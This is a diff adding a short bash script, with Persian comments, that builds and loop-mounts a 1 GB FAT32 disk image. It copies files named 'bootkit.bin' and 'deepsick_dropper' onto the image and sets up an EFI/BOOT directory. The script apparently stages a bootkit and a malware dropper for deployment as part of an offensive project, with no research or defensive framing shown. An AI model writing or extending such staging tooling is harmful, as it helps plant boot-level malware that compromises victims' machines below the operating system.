@@ -1,0 +1,24 @@
+#!/bin/bash
+# create_virtual_disk.sh
+
+# ایجاد دیسک مجازی 1GB
+dd if=/dev/zero of=virtual-disk.img bs=1M count=1024
+
+# فرمت به صورت FAT32
+mkfs.fat -F32 virtual-disk.img
+
+# مونت کردن دیسک
+mkdir -p mount_point
+sudo mount -o loop virtual-disk.img mount_point
+
+# کپی فایل‌های ضروری
+sudo cp bootkit.bin mount_point/
+sudo cp deepsick_dropper mount_point/
+sudo mkdir mount_point/EFI
+sudo mkdir mount_point/EFI/BOOT
+
+# آنمونت کردن
+sudo umount mount_point
+rmdir mount_point
+
+echo "Virtual disk created: virtual-disk.img"
